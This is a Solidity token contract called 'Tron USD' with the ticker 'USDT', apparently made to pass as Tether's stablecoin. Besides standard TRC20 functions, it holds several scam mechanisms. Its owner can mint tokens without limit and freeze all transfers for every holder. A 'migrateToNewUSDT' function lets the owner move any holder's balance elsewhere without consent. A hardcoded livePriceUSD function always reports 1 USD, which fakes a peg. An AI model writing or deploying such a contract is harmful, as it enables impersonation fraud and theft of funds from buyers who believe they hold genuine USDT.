// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TronUSD is ITRC20 {
    string public name = "Tron USD";
    string public symbol = "USDT";
    uint8 public decimals = 18;
    uint256 private _totalSupply;

    address public owner;
    bool public swapEnabled = true;
    string public logoURI = "ipfs://Qmf8bF5tw2igViXVQKTXwx1DjAyvy49hRfUWiVWeXu9K1R/logo.png";
    string public metadataURI = "ipfs://bafkreihinjynumwkt4j3xconx3dnwl5o6jn6f7wsvaauqiszehdseui6a4/TronUSD_Logo_256x256.png";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    constructor() {
        owner = msg.sender;
        _mint(owner, 900_000_000_000 * 10 ** decimals);
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(swapEnabled, "Swaps are currently disabled");
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) external view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(swapEnabled, "Swaps are currently disabled");
        require(_allowances[sender][msg.sender] >= amount, "Allowance exceeded");
        _allowances[sender][msg.sender] -= amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Insufficient balance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function mintTo(address recipient, uint256 amount) external onlyOwner {
        _mint(recipient, amount);
    }

    function toggleSwap(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    function migrateToNewUSDT(address from, address to, uint256 amount) external onlyOwner {
        require(_balances[from] >= amount, "Insufficient balance to migrate");
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    // Returns 1 USD per token for stable display
    function livePriceUSD() external pure returns (uint256) {
        return 1 * 10 ** 18; // Fixed to 1 USD (stablecoin)
    }
}
